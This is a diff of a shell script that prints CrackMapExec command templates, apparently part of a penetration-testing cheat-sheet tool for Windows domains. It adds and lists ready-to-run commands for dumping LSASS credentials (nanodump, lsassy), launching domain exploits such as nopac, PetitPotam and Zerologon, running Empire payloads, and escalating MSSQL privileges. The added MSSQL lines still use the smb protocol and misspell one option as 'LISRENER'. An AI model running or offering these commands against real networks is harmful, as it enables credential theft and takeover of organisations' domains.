@@ -387,14 +387,21 @@ echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_autolo
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_password"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M invoke_sessiongopher"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M lsassy"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M nanodump"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M nopac"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M rdp -o ACTION=enable"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M petitpotam"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M runasppl"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M spooler"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M tokens"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M uac"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M wdigest -o ACTION=enable"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M wireless"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M zerologon"
 
+echo -e "${IBLUE}MSSQL${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M empire_exec -o LISRENER=<Listener_Name>"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M mssql_priv"
 
 
 
